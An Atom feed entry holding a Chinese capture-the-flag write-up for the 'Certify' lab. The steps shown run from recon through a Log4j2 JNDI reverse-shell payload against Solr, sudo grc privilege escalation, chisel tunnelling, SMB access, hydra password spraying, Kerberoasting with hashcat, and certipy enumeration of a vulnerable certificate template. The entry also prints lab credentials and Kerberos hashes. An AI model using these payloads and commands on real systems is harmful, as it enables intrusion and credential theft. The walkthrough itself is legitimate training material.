<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>雲流のLowest World</title>
  
  
  <link href="http://c1oudfl0w0.github.io/blog/atom.xml" rel="self"/>
  
  <link href="http://c1oudfl0w0.github.io/blog/"/>
  <updated>2025-02-26T10:07:27.952Z</updated>
  <id>http://c1oudfl0w0.github.io/blog/</id>
  
  <author>
    <name>C1oudfL0w0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>春秋云境 Certify</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/</id>
    <published>2025-02-26T00:40:42.000Z</published>
    <updated>2025-02-26T10:07:27.952Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最后一点沙砾，打完这个靶场刚好</p><p>参考：</p><p><a href="https://fushuling.com/index.php/2023/10/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7certify/">https://fushuling.com/index.php/2023/10/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7certify/</a></p><p><a href="https://bowuchuling.github.io/posts/chunqiuCertify.html">https://bowuchuling.github.io/posts/chunqiuCertify.html</a></p><p><a href="https://exp10it.io/2023/08/chunqiuyunjing-certify-writeup/">https://exp10it.io/2023/08/chunqiuyunjing-certify-writeup/</a></p><span id="more"></span><hr><h1 id="solr-log4j2-jndi"><a href="#solr-log4j2-jndi" class="headerlink" title="solr log4j2 jndi"></a>solr log4j2 jndi</h1><p>访问给的 ip 是个 nginx，fscan 扫一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan <span class="token parameter variable">-h</span> <span class="token number">39.98</span>.119.159<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.119.159:22<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.119.159:80<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.119.159:22 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span> Banner:<span class="token punctuation">[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.119.159:8983<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:21<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.119.159:80 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>http<span class="token punctuation">]</span> 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.119.159:8983 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>http<span class="token punctuation">]</span> 产品:Apache Solr Banner:<span class="token punctuation">[</span>HTTP/1.1 <span class="token number">302</span> Found.Location: http://172.22.9.19:8983/solr/.<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 存活端口数量: <span class="token number">3</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 开始漏洞扫描<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 加载的插件: ssh, webpoc, webtitle<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://39.98.119.159      状态码:200 长度:612    标题:Welcome to nginx<span class="token operator">!</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:27<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://39.98.119.159:8983 状态码:302 长度:0      标题:无标题 重定向地址: http://39.98.119.159:8983/solr/<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:27<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://39.98.119.159:8983/solr/ 状态码:200 长度:16555  标题:Solr Admin<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 扫描已完成: <span class="token number">5</span>/5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>8983 端口上有个 solr 服务，在依赖里发现 log4j2</p><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226084920658.png" alt="image-20250226084920658"></p><p>接下来寻找注入点</p><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226085235545.png" alt="image-20250226085235545"></p><p>测试 jndi payload（这个接口抓包重放貌似不行）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>$<span class="token punctuation">&#123;</span>sys<span class="token operator">:</span>java<span class="token punctuation">.</span>version<span class="token punctuation">&#125;</span><span class="token punctuation">.</span>lazz9x0vcly5xsn3cn6l7798qzwqkg85<span class="token punctuation">.</span>oastify<span class="token punctuation">.</span>com<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226090034789.png" alt="image-20250226090034789"></p><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226090100672.png" alt="image-20250226090100672"></p><p>成功读到 jdk 版本</p><p>那么用 JNDIExploit 一把梭：<a href="https://github.com/0x727/JNDIExploit/releases/tag/1.1">https://github.com/0x727/JNDIExploit/releases/tag/1.1</a></p><p>vps 上起一个 LDAP 服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDIExploit-1.3-SNAPSHOT.jar <span class="token parameter variable">-i</span> VPS_IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>弹shell的payload为</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token constant">VPS_IP</span><span class="token operator">:</span><span class="token number">1389</span><span class="token operator">/</span><span class="token class-name">Basic</span><span class="token operator">/</span><span class="token class-name">ReverseShell</span><span class="token operator">/</span><span class="token constant">VPS_IP</span><span class="token operator">/</span><span class="token number">23333</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226091749330.png" alt="image-20250226091749330"></p><p>然后就弹shell了，但是权限太低没找到flag，看来得提权</p><h1 id="grc提权"><a href="#grc提权" class="headerlink" title="grc提权"></a>grc提权</h1><p>测试提权小连招走一波</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token function">sudo</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226092440061.png" alt="image-20250226092440061"></p><p>发现 grc 命令：<a href="https://gtfobins.github.io/gtfobins/grc/">https://gtfobins.github.io/gtfobins/grc/</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> grc <span class="token parameter variable">--pty</span> <span class="token function">cat</span> /root/flag/flag01.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag在 &#x2F;root&#x2F;flag&#x2F;flag01.txt</p><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226092801023.png" alt="image-20250226092801023"></p><hr><h1 id="信息收集-amp-代理"><a href="#信息收集-amp-代理" class="headerlink" title="信息收集 &amp; 代理"></a>信息收集 &amp; 代理</h1><p>wget 下载需要的软件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> grc <span class="token parameter variable">--pty</span> <span class="token function">wget</span> <span class="token number">121.40</span>.34.196:26666/fscan<span class="token function">sudo</span> grc <span class="token parameter variable">--pty</span> <span class="token function">wget</span> <span class="token number">121.40</span>.34.196:26666/proxy/chisel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>fscan 扫一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan <span class="token parameter variable">-h</span> <span class="token number">172.22</span>.9.19/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetInfo 扫描结果目标主机: <span class="token number">172.22</span>.9.7主机名: XIAORANG-DC发现的网络接口:   IPv4地址:      └─ <span class="token number">172.22</span>.9.7<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.9.19        状态码:200 长度:612    标题:Welcome to nginx<span class="token operator">!</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.9.7         状态码:200 长度:703    标题:IIS Windows Server<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetInfo 扫描结果目标主机: <span class="token number">172.22</span>.9.26主机名: DESKTOP-CBKTVMO发现的网络接口:   IPv4地址:      └─ <span class="token number">172.22</span>.9.26<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.9.47        状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.9.7      DC:XIAORANG<span class="token punctuation">\</span>XIAORANG-DC    <span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.9.47     fileserver                          Windows <span class="token number">6.1</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 系统信息 <span class="token number">172.22</span>.9.47 <span class="token punctuation">[</span>Windows <span class="token number">6.1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> SMB认证成功 <span class="token number">172.22</span>.9.47:445 administrator:123456<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> SMB2共享信息 <span class="token number">172.22</span>.9.47:445 administrator Pass:123456 共享:<span class="token punctuation">[</span>print$ fileshare IPC$<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.9.19:8983   状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.9.19:8983/solr/<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 目标: http://172.22.9.7:80  漏洞类型: poc-yaml-active-directory-certsrv-detect  漏洞名称:   详细信息:        author:AgeloVito        links:https://www.cnblogs.com/EasonJim/p/6859345.html<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:58<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.9.19:8983/solr/ 状态码:200 长度:16555  标题:Solr Admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">172.22</span>.9.7 XIAORANG-DC<span class="token number">172.22</span>.9.19 Solr<span class="token number">172.22</span>.9.26 DESKTOP-CBKTVMO<span class="token number">172.22</span>.9.47 fileserver <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后挂代理</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel server <span class="token parameter variable">-p</span> <span class="token number">33322</span> <span class="token parameter variable">--reverse</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel client vpsip:33322 R:0.0.0.0:44543:socks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>先打 172.22.9.47 的 smb 吧</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 smbclient.py <span class="token number">172.22</span>.9.47<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226102526279.png" alt="image-20250226102526279"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sharesuse fileshare<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>flag在 secret&#x2F;flag02.txt 下</p><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226102837858.png" alt="image-20250226102837858"></p><p>现在回根目录下载一下 personal.db</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get personnel.db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载位置就是本地启动的终端所在的文件夹</p><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226104149333.png" alt="image-20250226104149333"></p><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226104118422.png" alt="image-20250226104118422"></p><p>有一堆账密，猜测是密码喷洒，比较有可能的就是 172.22.9.26 这台</p><h1 id="密码喷洒-amp-SPN"><a href="#密码喷洒-amp-SPN" class="headerlink" title="密码喷洒 &amp; SPN"></a>密码喷洒 &amp; SPN</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> hydra <span class="token parameter variable">-L</span> xr_members.txt <span class="token parameter variable">-P</span> xr_users.txt <span class="token number">172.22</span>.9.26 rdp <span class="token operator">></span> result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226104927906.png" alt="image-20250226104927906"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zhangjian:i9XDE02pLVfliupeng:fiAzGwEMgTY<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但俩 rdp 都不上去，上面提示说考虑 SPN，试试查找下域用户下的SPN</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 GetUserSPNs.py <span class="token parameter variable">-request</span> -dc-ip <span class="token number">172.22</span>.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226105216870.png" alt="image-20250226105216870"></p><p>得到了 chenchen 和 zhangxia 的密码哈希</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>zhangxia<span class="token variable">$XIAORANG</span>.LAB<span class="token variable">$xiaorang</span>.lab/zhangxia*<span class="token variable">$088c35eb65f51706e7321bbb47f23218</span><span class="token variable">$fc340e9d698c0def2d4032d0e9457910c42a5f034c14171f365154e8420b2e72953e555f20e5c21b839a039601e46f804cfdaf007aa8773c6a526b936c352d449cc39035a7ce45c57f51b74628adea3c7440631192ed86ce6688cc2b9e0123df73fd8c3c271bb5334d556c63fc8a433b8d8f1a6bdb11f5df91c6dd60dde54617c97550a3e56be64efb5e3a01cc4db26a7194fe936594d858962c58f0d576ab1c996952d468fe74b598e2f07ddd314c3ea6f8dc2b4c6b4f0b3532e81288411f33505dd48041db135a1c23d41de65a2db3f0c5ebcf15e2fb93dff3dab8dcec59fcf3f40f80c59b7b6cb88a96161e65860bd15a0369bd676252a3824d0cd816cde48ee3c587c5cdfe787f39bcf7a63d02811a74a08a018e90871dc3a37ecc6ebac0e035f51b545c9daa1c21ca29c052e65d4401547eb09ce9f644bb83cd1a2e554f8122b7f4dad50ab57596dcbce31ca4a91a84138127224849a86d93fd7998123f1311b675629f85fbf3357d7eb3d7378ba6bf51492a227ad1187d711562de06d92b77f8a56197d4dadef5c10f8c29f2b1278353c964f7636e7f674e7b3203c9cba2dcc6134797cdfd8f9118c7d49fdaaceae530ea7d81893573a85e5a77a749c5ccbabc3a183f0253aab684f8ed3c87ad43b1e4d4cb993369a6ad04db0dab2d2897920d75a75b4aeb5620621ae421c469df6741c6c063ae9ca678c40c2596ba4b133614f6003c54aae9d23a10a4bc92048f8af0c25ba10713e1f383fddadf124dce3af626f6fdce34eb39d1945934fcd85a050b71d82165d61f4b3268d54cf71ed2cd13115c60df469e67002581228e66b41f7c4249c4a367567f37934c1729fc6ef242b6d9474ed5f7d41da0a9a8ec636f045be550a782fa9ca723fe3e8bd003a872542e80ef04ae924ae965690e137df57fcd74658358b05366a9817a727f0cc18ce6986e5b475278af87ad60e017065d2b1ddc96e33e7ef325850222654a3636d1fd5098bbeddcba18fd0eab3358a729c32d95f6522b09622893385b1c29f01c6047a3fa511a6c66a0e82a0867613564162f207e6aa700da9b0526f70b17d689c5a18315ad96098d86de13a4cd70a046affda0502a3539519045b97663a0849b9134ca30825b9eae274cfead2515eb18a882a48289a50fb2e89d54d5af423aa49596f69d95861045c03d6a1d35670096cbd47776671859a43c38795f7bae39670f14d4daa7fe87544009fcab1e0ba4dcbdba6db07714a2435a473a971774bb7081ad712066989e796e769da63578d639b7674861239f93a8ec6c1530f41a5280f9d4599e5b6b84ae579b575163e81911f8f64fea83f2982293d7c6d959f979802010f6ac51c92142a5ba200f3aa63a4aeec1244053944638cf6b934e4fd380f78288f7b53e2763b8fd3358f2b3a48856be289cd76ccc5c69987a5e7f2f259b2eaef94c495fd4badcfb420c7f90d5731c8c0e26d246f2d395645ea42d0e8029026171200a549d5276302dae85d3</span><span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>chenchen<span class="token variable">$XIAORANG</span>.LAB<span class="token variable">$xiaorang</span>.lab/chenchen*<span class="token variable">$0aaceee2e5d59d37503ab50b3576b70e</span><span class="token variable">$cb044405d1b4e07a4fb107a04cc6baa7d0d00c7950a60e094638e77d408a49023b3351cea1eb61fe742b0bda13afa79e2d7834a53ababeea4005f33e5762877cf4e448f7ddf0d1d3c6775ea2a07ffd2b4bd8f00c823509b57ced2fd30b165798a603dece2fb3e0516364fb4ef3698163a2b3cf00b8a01ede054a487973adb719d502f8b9fce01ac6a63a163fb04707d80ce5dccb085c5316d12cd23c8759fcae7c59c5dc0c22463f0bfeab50c6f889dda866d7ebedd4b88978df578c224bba8f4554e8c4908b8c28cd3e1d16ef26cbc9be323ecf5fed517af1473faa710aa3f68eb237bb326e7505eff89f5eb5b58b9102d30711f65eb154ca9f15becef4917ddd383845fbca8d8e9c7b105ba8f14d1c35faae811f1fd5a7f37ae6bd02b5e7e9eaae880379c6ce6da2b292c40e4cd4c4709b9f5a02a9308d0251e96067500da2c0ee2295a20bbf40219a7c26cb20bb614dc3c5ad774e42ee365c1ac614bec5e360a59eac443a5354cc0dfef10d737798258e2d0c143636a86b9126b45b2426b3ed4ecedf3d1ef274e2a575fe92b7c6c8612f00d22b4e4f9cbf8c46250cccab5773a8038ce5adc2050d6e91a057519c19d7ee70e07550981ed92727f5a66248da707132ff3d76eeae8d11e3eabe9f423eb6f1c2ad5e14ffbbe85fb8c7e9a654653272f51a9ea319f439a1ca516370887f6ec99cfeb67d63e769cdf70aed23189033da45a654aca07c48e34d00b30ec43a699a0242b57e77a2e9511135b9dd0a426639d117e3e467c7bcf73bd342f3fd666ee050e2d41e2615a97268bb847bec8cf012c3c1d9b5c6812a0c161886a6084778be1e2a0ce9d58cd9d691dc2388b0907bf00768589f71ca053e965d6343d09b56fbb3068fc6d476047d46acc0a9b940a706fc2bca6d59373acb7db52ae8a41ca8eb21728035044d6e190d637c698cc4b94f7b6f8907431c8f10c9f909b2cb3dd13e75113cdd84d4be1e33dcc3f97bc2b3290e11fcb54cbda9ee4140c64b3d917a57959e101436348f4f8c4344b12c19fcc86a658888395ac6d04ca18ef79c7f15e327cfe700c459da75207dfb3b0c946fe0f95248661b8b3ee44259c402fa02d81535d74a41526bd17ebd8cf9ebe53b196e4a4907ad6318338817cf2d0fa858a6c296cfc79596cbdac45dc827a1b65f4b09596b3f2d15591bed9dcc0fca5439b87e81f5496f71a764ce3bfd937819c5e3f972e35f2988e8d031cfbe1c9a1c60901ff3e05c38c97b25dd7223f8c63c9abc685fdcd2e87b7779d7035d09ee13eb3ac72556c89a607c7f92d4c13593cdeaa231395d87359f03766172a6e9bf132c89862cb7eecd343a831eb46ae144e54010746c918a335c467669358e231f45e0b6115fb7e5c727ad75bd9a3bd45652e78447e49dd02d118226795752b7a3170a3276ea44e54527c209fdabfc926e08d4f05a7bafc0c661b2cb871cd64231dfaf5e05ad2ab187ffcac03388c91783be2e3157cbe26149771d7c6a02cd771b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>hashcat爆一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">13100</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token number">2</span>.txt /usr/share/wordlists/rockyou.txt <span class="token parameter variable">--force</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226105555059.png" alt="image-20250226105555059"></p><p>得到</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">xiaorang.lab\zhangxia:MyPass2@@6xiaorang.lab\chenchen:@Passw0rd@<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么就能 RDP 172.22.9.26 上去了</p><h1 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h1><p>rdp登录成功，但是 flag 在管理员目录下没有权限读 flag，由于存在CA认证服务器结合题目名，尝试查看是否存在错误配置的证书</p><p>AD CS 信息</p><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226110322776.png" alt="image-20250226110322776"></p><p>Certipy 跑一遍可以利用的证书。参考：<a href="https://www.freebuf.com/articles/network/318126.html">https://www.freebuf.com/articles/network/318126.html</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains certipy <span class="token function">find</span> <span class="token parameter variable">-u</span> <span class="token string">'liupeng@xiaorang.lab'</span>  <span class="token parameter variable">-password</span> <span class="token string">'fiAzGwEMgTY'</span> -dc-ip <span class="token number">172.22</span>.9.7 <span class="token parameter variable">-vulnerable</span> <span class="token parameter variable">-stdout</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Certificate Authorities  <span class="token number">0</span>    CA Name                             <span class="token builtin class-name">:</span> xiaorang-XIAORANG-DC-CA    DNS Name                            <span class="token builtin class-name">:</span> XIAORANG-DC.xiaorang.lab    Certificate Subject                 <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>xiaorang-XIAORANG-DC-CA, <span class="token assign-left variable">DC</span><span class="token operator">=</span>xiaorang, <span class="token assign-left variable">DC</span><span class="token operator">=</span>lab    Certificate Serial Number           <span class="token builtin class-name">:</span> 43A73F4A37050EAA4E29C0D95BC84BB5    Certificate Validity Start          <span class="token builtin class-name">:</span> <span class="token number">2023</span>-07-14 04:33:21+00:00    Certificate Validity End            <span class="token builtin class-name">:</span> <span class="token number">2028</span>-07-14 04:43:21+00:00    Web Enrollment                      <span class="token builtin class-name">:</span> Disabled    User Specified SAN                  <span class="token builtin class-name">:</span> Unknown    Request Disposition                 <span class="token builtin class-name">:</span> Unknown    Enforce Encryption <span class="token keyword">for</span> Requests     <span class="token builtin class-name">:</span> UnknownCertificate Templates  <span class="token number">0</span>    Template Name                       <span class="token builtin class-name">:</span> XR Manager    Display Name                        <span class="token builtin class-name">:</span> XR Manager    Certificate Authorities             <span class="token builtin class-name">:</span> xiaorang-XIAORANG-DC-CA    Enabled                             <span class="token builtin class-name">:</span> True    Client Authentication               <span class="token builtin class-name">:</span> True    Enrollment Agent                    <span class="token builtin class-name">:</span> False    Any Purpose                         <span class="token builtin class-name">:</span> False    Enrollee Supplies Subject           <span class="token builtin class-name">:</span> True    Certificate Name Flag               <span class="token builtin class-name">:</span> EnrolleeSuppliesSubject    Enrollment Flag                     <span class="token builtin class-name">:</span> PublishToDs                                          IncludeSymmetricAlgorithms    Private Key Flag                    <span class="token builtin class-name">:</span> <span class="token number">16777216</span>                                          <span class="token number">65536</span>                                          ExportableKey    Extended Key Usage                  <span class="token builtin class-name">:</span> Encrypting File System                                          Secure Email                                          Client Authentication    Requires Manager Approval           <span class="token builtin class-name">:</span> False    Requires Key Archival               <span class="token builtin class-name">:</span> False    Authorized Signatures Required      <span class="token builtin class-name">:</span> <span class="token number">0</span>    Validity Period                     <span class="token builtin class-name">:</span> <span class="token number">1</span> year    Renewal Period                      <span class="token builtin class-name">:</span> <span class="token number">6</span> weeks    Minimum RSA Key Length              <span class="token builtin class-name">:</span> <span class="token number">2048</span>    Permissions      Enrollment Permissions        Enrollment Rights               <span class="token builtin class-name">:</span> XIAORANG.LAB<span class="token punctuation">\</span>Domain Admins                                          XIAORANG.LAB<span class="token punctuation">\</span>Domain Users                                          XIAORANG.LAB<span class="token punctuation">\</span>Enterprise Admins                                          XIAORANG.LAB<span class="token punctuation">\</span>Authenticated Users      Object Control Permissions        Owner                           <span class="token builtin class-name">:</span> 